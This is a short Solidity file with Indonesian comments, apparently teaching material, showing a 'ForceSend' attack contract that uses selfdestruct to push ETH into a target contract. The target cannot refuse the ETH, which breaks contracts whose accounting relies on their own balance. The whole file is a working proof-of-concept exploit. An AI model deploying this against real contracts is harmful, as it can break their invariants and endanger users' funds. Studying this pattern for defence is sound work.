// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title ForceSend
 * @notice Contract yang FORCE-SEND ETH ke alamat manapun via selfdestruct
 *
 * MASALAH:
 *   Kalau lo punya contract yang rely pada `address(this).balance`:
 *   → "withdraw all ETH in this contract"
 *   → Tapi attacker bisa FORCE-SEND ETH ke contract lo
 *   → Balance naik tanpa melalui deposit()
 *   → Accounting jadi SUSAH
 *
 * selfdestruct:
 *   → Menghapus contract dari blockchain
 *   → SEMUA ETH di contract dikirim ke target address
 *   → ⚠️ Tidak bisa dicegah! Receive/fallback gak dipanggil!
 *   → ⚠️ Target contract GAK BISA nolak terima ETH
 *   → ⚠️ Ini satu-satunya cara force-send ETH tanpa cooperation
 */
contract ForceSend {
    // Force-send ETH ke target address
    function attack(address payable target) external payable {
        require(msg.value > 0, "Send ETH to force");

        // Deploy mini contract yang langsung selfdestruct
        ForceSender forceSender = new ForceSender();
        forceSender.attackAndDie{value: msg.value}(target);
    }
}

/**
 * @title ForceSender
 * @notice Mini contract yang selfdestruct setelah kirim ETH
 * @dev Gak ada receive() atau fallback di target!
 *      Tapi selfdestruct tetap bisa kirim ETH
 */
contract ForceSender {
    function attackAndDie(address payable target) external payable {
        require(msg.value > 0, "Need ETH");

        // selfdestruct: kirim SEMUA ETH ke target, lalu hapus contract ini
        // Target contract GAK BISA nolak!
        // Receive/fallback gak dipanggil!
        selfdestruct(target);
    }
}
